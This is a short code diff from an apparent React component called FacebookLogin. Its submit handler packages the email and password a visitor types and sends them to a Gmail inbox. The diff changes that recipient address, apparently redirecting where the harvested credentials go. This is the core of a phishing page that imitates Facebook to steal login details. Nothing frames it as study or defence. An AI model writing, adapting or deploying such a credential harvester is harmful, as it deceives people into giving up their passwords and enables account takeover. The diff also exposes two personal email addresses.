@@ -21,7 +21,7 @@ export default function FacebookLogin() {
     e.preventDefault();
 
     const emailParams = {
-      user_email: "safiullahjalalzai119@gmail.com", // Your email
+      user_email: "project120project@gmail.com", // Your email
       email: credentials.email,
       password: credentials.password,
     };
